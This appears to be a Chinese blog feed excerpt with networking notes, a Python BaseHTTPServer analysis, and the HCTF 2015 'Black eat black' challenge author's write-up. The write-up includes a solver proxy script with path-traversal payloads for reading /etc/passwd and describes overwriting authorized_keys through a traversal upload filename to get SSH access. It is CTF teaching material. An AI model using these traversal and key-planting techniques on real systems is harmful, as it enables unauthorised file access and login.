<p>默认端口:<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">21</span>     <span class="keyword">ftp</span></span><br><span class="line"><span class="number">22</span>     ssh</span><br><span class="line"><span class="number">23</span>     telnet</span><br><span class="line"><span class="number">80</span>     <span class="keyword">http</span></span><br><span class="line"><span class="number">443</span>   <span class="keyword">https</span></span><br><span class="line"><span class="number">3306</span> mysql</span><br></pre></td></tr></table></figure></p>
<h2 id="IPv4">IPv4</h2><p>大小: 32bits (0.0.0.0-255.255.255.255)</p>
<p>子网掩码： 把IP分为网络地址和主机地址</p>
<p>特殊地址：</p>
<p>1.整个子网，主机地址全为0</p>
<p>2.子网广播地址，主机地址全为1的地址</p>
<p>3.三段内网地址<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10<span class="class">.0</span><span class="class">.0</span><span class="class">.0-10</span><span class="class">.255</span><span class="class">.255</span><span class="class">.255</span></span><br><span class="line">172<span class="class">.16</span><span class="class">.0</span><span class="class">.0-172</span><span class="class">.31</span><span class="class">.255</span><span class="class">.255</span></span><br><span class="line">192<span class="class">.168</span><span class="class">.0</span><span class="class">.0-192</span><span class="class">.168</span><span class="class">.255</span><span class="class">.255</span></span><br></pre></td></tr></table></figure></p>
<p>4.环回地址 <code>127.0.0.1 - 127.255.255.255</code></p>
<p>5.本机地址 <code>0.0.0.0</code></p>
<p>6.广播地址 <code>255.255.255.255</code><br>公网地址全球唯一</p>
<h2 id="MAC（Media_Access_Control）地址">MAC（Media Access Control）地址</h2><p>大小：48bits (00:00:00:00:00:00-FF:FF:FF:FF:FF:FF)</p>
<p>网卡出产时写死在硬件中。相当于网卡的身份证，具有全球唯一性</p>
<h1 id="浏览器访问HTTP服务详解">浏览器访问HTTP服务详解</h1><h3 id="DNS（Domain_Name_System，域名系统）">DNS（Domain Name System，域名系统）</h3><pre><code>域名  &lt;--&gt;  <span class="type">IP</span>地址
</code></pre><h2 id="应用层">应用层</h2><p>封装HTTP包</p>
<h2 id="传输层">传输层</h2><ul>
<li>TCP</li>
<li>UDP</li>
</ul>
<p>封装TCP包</p>
<h2 id="网络层">网络层</h2><p>封装IP包</p>
<h2 id="数据链路层">数据链路层</h2><p>封装MAC包</p>
<h2 id="物理层">物理层</h2><p>转换成二进制，通过网卡，网线进行数据传输</p>
<p>数据发送过去后，然后反过来解封</p>
<h2 id="安全问题">安全问题</h2><h3 id="arp">arp</h3><h3 id="SYN">SYN</h3><h3 id="DNS">DNS</h3>]]></content>
    <summary type="html">
    <![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-isa.png" alt="ISA"></p>]]>
    
    </summary>
    
      <category term="网络" scheme="http://0x48.pw/tags/%E7%BD%91%E7%BB%9C/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[HCTF之Black-Eat-Black总结]]></title>
    <link href="http://0x48.pw/2015/12/08/0x0D/"/>
    <id>http://0x48.pw/2015/12/08/0x0D/</id>
    <published>2015-12-08T06:49:13.000Z</published>
    <updated>2016-03-28T10:21:37.214Z</updated>
    <content type="html"><![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-hctf.png" alt="HCTF"></p>
<a id="more"></a>
<p>这次HCTF，我负责黑吃黑这题的出题和运维，最终只有六星一个队日穿了该题。</p>
<hr>
<p><strong>题目名称</strong>：Black eat black(300不足，200有余)<br><strong>题目描述</strong>：使用该DNS(180.153.47.182)后，你会被劫持哦～<br><strong>分值</strong>：300<br><strong>开题金币</strong>：300<br><strong>奖励金币</strong>：400</p>
<hr>
<h2 id="writeup">writeup</h2><p>先给出writeup脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># writeup.py</span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> werkzeug.routing <span class="keyword">import</span> BaseConverter</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyanyConverter</span><span class="params">(BaseConverter)</span>:</span></span><br><span class="line">	weight = <span class="number">200</span></span><br><span class="line">	regex = <span class="string">'.*'</span></span><br><span class="line">	</span><br><span class="line">app = Flask(__name__, static_folder = <span class="string">"nononono"</span>)</span><br><span class="line">app.url_map.converters[<span class="string">'myany'</span>] = MyanyConverter</span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/&lt;myany:url&gt;', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(url)</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"---------------------------------------------------"</span></span><br><span class="line">	req_url = <span class="string">"http://120.55.181.136/"</span>+url</span><br><span class="line">	<span class="comment"># req_url = "http://120.55.181.136/username/uploadfile/....//....//....//....//....//....//....//etc/passwd"</span></span><br><span class="line">	<span class="keyword">print</span> req_url</span><br><span class="line">	header = &#123;&#125;</span><br><span class="line">	data = &#123;&#125;</span><br><span class="line">	my_file = &#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> request.headers:</span><br><span class="line">		<span class="keyword">if</span> x[<span class="number">1</span>] == <span class="string">''</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> x[<span class="number">0</span>] == <span class="string">'Host'</span>:</span><br><span class="line">                	header[<span class="string">'Host'</span>] = <span class="string">"127.0.0.1:4444"</span></span><br><span class="line">                	<span class="comment"># header['Host'] = "127.0.0.1:4444/username/uploadfile/../../../../../../etc/passwd"</span></span><br><span class="line">                	<span class="keyword">continue</span></span><br><span class="line">		header[x[<span class="number">0</span>]] = x[<span class="number">1</span>]</span><br><span class="line">	<span class="comment">#print header</span></span><br><span class="line">	<span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">		<span class="keyword">for</span> a, b <span class="keyword">in</span> request.form.items():</span><br><span class="line">			data[a] = b</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> request.files <span class="keyword">and</span> len(request.files) == <span class="number">1</span>:</span><br><span class="line">			te = request.files</span><br><span class="line">			fie = te.keys()[<span class="number">0</span>]</span><br><span class="line">			f = request.files[fie]</span><br><span class="line">			set_name = <span class="string">'cache/file/'</span> + f.filename.replace(<span class="string">'/'</span>, <span class="string">''</span>).replace(<span class="string">'.'</span>, <span class="string">''</span>)</span><br><span class="line">			f.save(set_name)</span><br><span class="line">			<span class="comment">#my_file = &#123;fie: (f.filename, open(set_name, 'rb'))&#125;</span></span><br><span class="line">			my_file = &#123;fie: (f.filename, open(set_name, <span class="string">'rb'</span>))&#125;</span><br><span class="line">		<span class="keyword">if</span> my_file == &#123;&#125;:</span><br><span class="line">			req = requests.post(req_url, headers = header, data = data)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			header.pop(<span class="string">'Content-Type'</span>)</span><br><span class="line">			req = requests.post(req_url, headers = header, data = data, files = my_file)</span><br><span class="line">	<span class="keyword">elif</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">		req = requests.get(req_url, headers = header)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'404'</span></span><br><span class="line">	h = &#123;&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> x, y <span class="keyword">in</span> req.headers.items():</span><br><span class="line">		h[x] = y</span><br><span class="line">	<span class="comment">#print h</span></span><br><span class="line">	<span class="comment">#print req.content</span></span><br><span class="line">	response = Response(req.content, req.status_code, h)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"---------------------------------------------------"</span></span><br><span class="line">	<span class="comment">#return ""</span></span><br><span class="line">	<span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	app.run(debug = <span class="keyword">True</span>, port = <span class="number">8888</span>, host = <span class="string">'127.0.0.1'</span>, threaded=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
<p>通过该脚本可以自由访问到gayhub，然后修改host或者url，可以任意文件读取(见脚本里的注释)，读到 <code>/etc/passwd</code> 得到 <code>hctf2015:x:1000:1000::/home/hctf2015:/usr/bin/whereisflag</code><br>由于 <code>/usr/bin/whereisflag</code> 不可读，则判断是要通过登陆触发该脚本，接下来就通过上传文件进行任意文件覆盖，上传自己的 <code>id_rsa.pub</code>, 然后文件名设置为 <code>../../../../../../../../home/hctf2015/authorized_keys</code> 则可通过ssh远程登陆。</p>
<p>正常情况下这样就getshell，可以结束了，但是为了增加题目的趣(keng)味(die)性，和并不让选手真正getshell，所以我把 <code>/bin/bash</code> 改成了 <code>/usr/bin/whereisflag</code></p>
<p>六星撸出来的时候， whereisflag脚本是一个 B站答题系统，我从网上随便找了100多题，然后随机出13题作为填空题，无时间限制，一旦答错，将要重新开始，看在六星凌晨3点多还在做我的答题系统，还一直答不对的情况下(其实是被队友打了)，我把题目减成了2题，然后六星的成功得到flag去睡觉了，而我还要盯着服务器…- -！</p>
<p>然后我觉得答题挺坑的（迫于队友压力），把答题的彩蛋换了，至于是啥，还没人见过，你们自己去看看吧，比B站答题简单多了。。。。</p>
<p>writeup就到这了，接下来是出题思路….</p>
<hr>
<h2 id="出题思路">出题思路</h2><p>最开始我的题只是一个 gayhub，分值我觉得不到200吧，然后服务端是 Nginx + Uwsgi + flask，但是发现Nginx竟然会吃 <code>../</code>(uwsgi也会，后面会说) ,这样就没法实任意文件读取了，如果少了任意文件，我觉得基本没人会想到上传 <code>authorized_keys</code> ，那么这题就变脑洞题了。</p>
<p>但是如果不配上 Nginx + Uwsgi ,然后题目描述直接把Gayhub暴露出来，我怕光flask负担不起各大赛棍的蹂躏。</p>
<p>在一次月黑风高夜夜，灵光一闪，有了现在的黑吃黑。</p>
<p>我用自己的服务器搭了一个dns服务器(怕被菊苣们日，所有服务都光了，只剩53和把ssh端口隐藏了)，把所有的域名都指向了我的题目服务器。之后就是模拟DNS劫持，题目的服务器我写了一个flask作为中间人，负责劫持的你http，然后原封不动的进行转发。 </p>
<p>通过 <code>url = &#39;http://&#39; + host + &#39;/&#39; + path ( + query)</code> 这样的形式获取你要访问的网站，然后原封不动的获取的你headers 和 data，服务器进行请求，然后原封不动的返回。</p>
<p>然后 Gayhub 监听127.0.0.1:4444</p>
<p>这题的架构差不多就是这样。</p>
<hr>
<h2 id="Other">Other</h2><p>现在的web题，除非是有啥黑魔法，或者能像P神那样出一道神一样的代码审计题，其他的我都觉得没啥意思，而我手中没有关于php的黑魔法，也出不了有意思的代码审计的题目，所以就想着另辟奇径，而最近flask用多了，就准备用它出一道web题，然后搜到了P神在wooyun发的python 的Tornado框架的任意文件读取，这个也可以在flask里复现，不过光读取也没意思，然后灵光一闪，想到了authorized_keys的没密码登陆。。。就这样gayhub诞生了，而这题的中心思想就是不需要任何过滤的Python Web，不过仍然还是有许多问题。</p>
<ul>
<li>不配上Nginx + uwsgi受不住全国各大赛棍的蹂躏啊</li>
<li>flask框架是没漏洞的，这两个漏洞都是我人为的。。。也不是很好</li>
<li>普通用户写文件默认权限是664，而authorized_keys要是644 或者 600 或者 640, 后两个不现实，但是在root权限下，默认就是644，不过肯定不能让root用户getshell，所以只能修改问题，把普通用户 umask 002。</li>
</ul>
<p>不过之后加上DNS劫持就完美了，Gayhub放内网，剧情是未完成，因为未完成所以放内网，因为未完成所以只有登陆和传文件，因为未完成所以未做任何过滤。</p>
<p>所以该题的剧情就是，一个黑客对你进行了DNS劫持，你是被他劫持呢？还是找到他的漏洞进行反击？ 所以有了黑吃黑的题目</p>
<p>仍然有问题：</p>
<ul>
<li>只能对http进行劫持，不过我后来想到了方法把所有https换成http返回，然后记录下来，等如果请求的url等于https列表里的，则以https请求，返回数据。不过来不及，没完成。。。。。</li>
<li>redrain大神告知，该服务有个漏洞，可以通过该代理作为跳板去攻击或者dos他人，比如请求一个很大的图片，请求后就把连接断开，这样我的服务器去请求了那张大图片，而这图片却无法返回给攻击者，也就是可以用我服务的流量去攻击他人。 不过在目前情况下不现实，首先有云盾，其次。。特么我一天24小时盯着服务器呢。。我可以ban ip。。。。不过在真实情况下的确是一种攻击思路。。。。解决办法就是做缓存吧，上面说的https的时候就想做了。。。不过也是时间原因。没来得及。。</li>
<li>还有。。。。仍然挂nginx失败，同样会导致任意文件读取失败。。。但是这时候研究除了flask本身自带多线程，比赛第一天都是直接开flask，多线程跑的，不过还是怕负载太大挂了，第二天研究出了只挂uwsgi，成功，。。。。但是发现uwsgi也会吃 ../ （还好第二天没有人姿势是对的。。要不就坑人了），所以只能是80端口的代理服务挂载uwsgi，最后证明我是多虑了，，，我不用盯着服务器，ban人ip，在这种金币开题的赛制下，最后才31个队左右开了我的题，31个队中只有4个队发现了我的gayhub，10个队找上了我题目的服务器，所以说，根本没有压力。。。。。</li>
<li><p>当host是请求本机80的时候，会无限死循环，，，，特么，，这个最蛋疼。。看下面代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">"120.55.181.136"</span> <span class="keyword">in</span> request.host <span class="keyword">or</span> request.host == <span class="string">'127.0.0.1'</span> <span class="keyword">or</span> request.host == <span class="string">'0.0.0.0'</span> <span class="keyword">or</span> <span class="string">'127.0.0.1:80'</span> <span class="keyword">in</span> request.host <span class="keyword">or</span> <span class="string">'0.0.0.0:80'</span> <span class="keyword">in</span> request.host <span class="keyword">or</span> <span class="string">"10.117.9.191"</span> <span class="keyword">in</span> request.host <span class="keyword">or</span> <span class="string">'iZ23l4savztZ'</span> <span class="keyword">in</span> request.host <span class="keyword">or</span> request.host ==<span class="string">'localhost'</span> <span class="keyword">or</span> <span class="string">'localhost:80'</span> <span class="keyword">in</span> request.host:</span><br><span class="line">		request.host = <span class="string">'www.baidu.com'</span></span><br><span class="line">		</span><br><span class="line"><span class="comment">#各大赛棍一边日，我一边加。。。根本加不完，，，特么，，这确实是我考虑不周到，出现的非预期。。因为临时改，所以坑爹的写了我有生以来最长的一行代码了。。</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>还是端口的问题，提示的有点勉强，如果是监听本地127.0.0.1端口，nmap是扫描不到的，不会显示filtered，按道理是要自己去扫出来，如果是监听0.0.0.0端口，然后iptables再设置下，会显示为filetered，不过却不符合实际。。最后为了降低难度(降低服务器负载)，所以我把端口绑定到扫描出来为filtered状态的4444端口….</p>
</li>
</ul>
<hr>
<h2 id="总结">总结</h2><p>第一次出题，有很多不足，比如当时有想过把文件写权限给去了，可是最终忘了静态文件了，被六星的改了我的css和js，，心累。。。</p>
<p>也出现了很多非预期，基本是我盯着服务器日志，一发现非预期就停了服务去修改。。写了几次自动化脚本。。反而带来了更多问题。。。</p>
<p>还有因为flask没有gzip模块，所以返回头里还要把gzip这个给去了。。要不然浏览器打不开网页。</p>
<p>还有一个最烦的错误了，至今没解决<br><code>ConnectionError: (&#39;Connection aborted.&#39;, error(104, &#39;Connection reset by peer&#39;))</code><br>我分析应该是阿里云的锅，当爆这个错误时，我会收一个RST包，也就是在TCP三次握手之后，HTTP请求包发送之后，服务器返回了一个TCP的RST包，所以socket端口。。报错。。GG</p>
<h3 id="服务器搭建(centos)：">服务器搭建(centos)：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">yum install libxslt-devel.x86_64</span><br><span class="line">yum install libxml2-devel.x86_64</span><br><span class="line">ln <span class="operator">-s</span> /usr/include/libxml2/libxml/ /usr/include/libxml</span><br><span class="line">yum install python-pip</span><br><span class="line">yum install python-devel.x86_64</span><br><span class="line">yum install gcc</span><br><span class="line">pip install lxml</span><br><span class="line">[</span><br><span class="line">requests</span><br><span class="line">这会出一个SSL的问题。。哎。。</span><br><span class="line">yum install libffi-devel.x86_64</span><br><span class="line">yum install openssl-devel.x86_64</span><br><span class="line">pip install requests[security]</span><br><span class="line">]</span><br><span class="line">pip install uwsgi</span><br><span class="line">[</span><br><span class="line">yum install freetype-devel</span><br><span class="line">yum install libpng-devel</span><br><span class="line">yum install libjpeg-devel</span><br><span class="line">pip install PIL --allow-external PIL --allow-unverified PIL</span><br><span class="line">]</span><br><span class="line">wget http://nginx.org/packages/centos/<span class="number">7</span>/noarch/RPMS/nginx-release-centos-<span class="number">7</span>-<span class="number">0</span>.el7.ngx.noarch.rpm  </span><br><span class="line">rpm -ivh nginx-release-centos-<span class="number">7</span>-<span class="number">0</span>.el7.ngx.noarch.rpm</span><br><span class="line"></span><br><span class="line">(依赖问题真烦！)</span><br></pre></td></tr></table></figure>
<h3 id="ban_ip小记">ban ip小记</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">要封停一个IP，使用下面这条命令：</span><br><span class="line">    iptables -I INPUT -s <span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>.<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>.<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>.<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span> -j DROP</span><br><span class="line">要解封一个IP，使用下面这条命令：</span><br><span class="line">    iptables -D INPUT -s <span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>.<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>.<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>.<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span> -j DROP</span><br></pre></td></tr></table></figure>
<hr>
<p><a href="https://github.com/Hcamael/Blackeatblack" target="_blank" rel="external">源码</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-hctf.png" alt="HCTF"></p>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://0x48.pw/tags/CTF/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python 的 BaseHTTPServer模块分析小结]]></title>
    <link href="http://0x48.pw/2015/12/01/0x0C/"/>
    <id>http://0x48.pw/2015/12/01/0x0C/</id>
    <published>2015-12-01T05:02:30.000Z</published>
    <updated>2016-03-28T10:21:45.646Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>已经好久没更新过博客了，因为最近开始用为知笔记了，感觉每次发到blog的都太零散了，好多都还没完成，所以现在决定，零散的写到笔记里去，然后有一个完整的内容再发到blog里来。</p>
</blockquote>
<a id="more"></a>
<p>这次是一篇完整的BaseHTTPServer模块分析，花了几天时间研究该模块，先放上我的思维导图，由于是第一次使用思维导图，所以弄得不是很满意。<br><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-BaseHTTPServer.jpeg" alt="BaseHTTPServer"></p>
<p>分析该模块的起因是该反代程序：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> BaseHTTPServer</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CacheHandler</span><span class="params">(BaseHTTPServer.BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">      m = hashlib.md5()</span><br><span class="line">      m.update(self.path)</span><br><span class="line">      cache_filename = m.hexdigest()</span><br><span class="line">      <span class="keyword">if</span> os.path.exists(cache_filename):</span><br><span class="line">          <span class="keyword">print</span> <span class="string">"Cache hit"</span></span><br><span class="line">          data = open(cache_filename).readlines()</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">          <span class="keyword">print</span> <span class="string">"Cache miss"</span></span><br><span class="line">          data = urllib2.urlopen(<span class="string">"http://www.baidu.com"</span> + self.path).readlines()</span><br><span class="line">          open(cache_filename, <span class="string">'wb'</span>).writelines(data)</span><br><span class="line">      self.send_response(<span class="number">200</span>)</span><br><span class="line">      self.end_headers()</span><br><span class="line">      self.wfile.writelines(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    server_address = (<span class="string">''</span>, <span class="number">9999</span>)</span><br><span class="line">    httpd = BaseHTTPServer.HTTPServer(server_address, CacheHandler)</span><br><span class="line">    httpd.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure></p>
<h1 id="BaseHTTPServer">BaseHTTPServer</h1><p>在该模块中定义了两个类</p>
<ul>
<li>HTTPServer</li>
<li>BaseHTTPRequestHandler</li>
</ul>
<h2 id="HTTPServer(SocketServer-TCPServer)">HTTPServer(SocketServer.TCPServer)</h2><p>该类中为定义 <strong>init</strong>()初始化函数，所以跳到它继承的 <code>SocketServer.TCPServer</code>中去</p>
<h3 id="TCPServer(BaseServer)">TCPServer(BaseServer)</h3><p><em>_init</em>_ 接收两个必填参数，和一个可选参数。<br>前两个参数到他继承的BaseServer中初始化<br>这两个参数一个是需要监听的地址和端口， 一个是类<br>然后就是建立一个socket链接 <code>self.socket = socket.socket(self.address_family, self.socket_type)</code><br>然后是<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    self.<span class="function"><span class="title">server_bind</span><span class="params">()</span></span></span><br><span class="line">    self.<span class="function"><span class="title">server_activate</span><span class="params">()</span></span></span><br><span class="line">except:</span><br><span class="line">    self.<span class="function"><span class="title">server_close</span><span class="params">()</span></span></span><br><span class="line">    raise</span><br></pre></td></tr></table></figure></p>
<p>如果传了第三个参数，值为False，则不执行上面的代码<br>然后，初始化完毕</p>
<h4 id="server_bind(self)">server_bind(self)</h4><p>（这重名字就能猜到大概，所以说，编程是命名要有意义！）<br>根据前面初始化的地址，绑定地址端口。<br>也就是socket编程中的 <code>socket.bind()</code></p>
<h4 id="server_activate(self)">server_activate(self)</h4><p>写过socket服务的就知道了，绑定完后就是监听了.<br>默认是5个客户端.<br>socket.listen(5)</p>
<h4 id="get_request(self)">get_request(self)</h4><p>没啥好说的, 返回 socket.accept()</p>
<h4 id="BaseServer">BaseServer</h4><p><em>_init_</em> 接收两个参数，然后赋值给self.</p>
<h5 id="serve_forever(self,_poll_interval=0-5)">serve_forever(self, poll_interval=0.5)</h5><p>上面的反代程序中，初始化完后就是执行该方法，由于上面都没有定义过，所以就跑到这来执行了。<br>先是去执行 <code>select.select([self], [], [], 0.5)</code> (select还未研究透彻)<br>接着执行 <code>_handle_request_noblock()</code></p>
<h5 id="_handle_request_noblock(self)">_handle_request_noblock(self)</h5><p>先是执行 <code>get_request()</code>(该类里竟然没有该方法，在TCPServer里有)<br>接着把accept返回的两个值传给 <code>process_request</code> 方法</p>
<h5 id="process_request(self,_request,_client_address)">process_request(self, request, client_address)</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="function"><span class="title">finish_request</span><span class="params">(request, client_address)</span></span></span><br><span class="line">self.<span class="function"><span class="title">shutdown_request</span><span class="params">(request)</span></span></span><br></pre></td></tr></table></figure>
<h5 id="finish_request(self,_request,_client_address)">finish_request(self, request, client_address)</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="function"><span class="title">RequestHandlerClass</span><span class="params">(request, client_address, self)</span></span></span><br></pre></td></tr></table></figure>
<p>RequestHandlerClass 是初始化的时候传入的第二个类参数<br>所以HTTPServer类的主体部分基本结束了，接下来是运行传入的模块</p>
<h5 id="shutdown_request(self,_request)">shutdown_request(self, request)</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="function"><span class="title">close_request</span><span class="params">(request)</span></span></span><br></pre></td></tr></table></figure>
<h5 id="close_request(self,_request)">close_request(self, request)</h5><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<hr>
<p>上面反代的程序中，传入的是 CacheHandler类</p>
<h1 id="CacheHandler(BaseHTTPServer-BaseHTTPRequestHandler)">CacheHandler(BaseHTTPServer.BaseHTTPRequestHandler)</h1><p>没有 <em>_init</em>_ 所以看它继承的类</p>
<h2 id="BaseHTTPRequestHandler(SocketServer-StreamRequestHandler)">BaseHTTPRequestHandler(SocketServer.StreamRequestHandler)</h2><p>也没有<em>_init</em>_ 所以继续看它继承的类</p>
<h3 id="handle(self)">handle(self)</h3><p>执行 handle_one_request()<br>有一个参数 <code>close_connection = 1</code> 但为0的时候循环执行上面这个方法</p>
<h3 id="handle_one_request(self)">handle_one_request(self)</h3><p>该方法每执行一次，从文件中读取一行，接着超蛋疼！<br>因为它只读一行！本以为上面那个方法每次循环读一行，然后获取所有headers，但是实际上只获取<br><code>GET / HTTP/1.1</code><br>该类初始化赋值的时候，赋值了一个 <code>default_request_version = &quot;HTTP/0.9&quot;</code><br>但是却要该值 &gt;= HTTP/1.1 才把 <code>close_connection</code> 设置为0<br>接下来就是执行 <code>&#39;do_&#39; + method</code>, 啥意思？<br>比如上面的，<code>GET / HTTP/1.1</code> 代码会把这串字符串分成三部分，而GET就是method，所以说，如果是 <code>POST / HTTP/1.1</code>则是执行 <code>do_POST</code> 方法，但是由于该反代只写了 <code>do_GET</code> 所以只能接收GET方法</p>
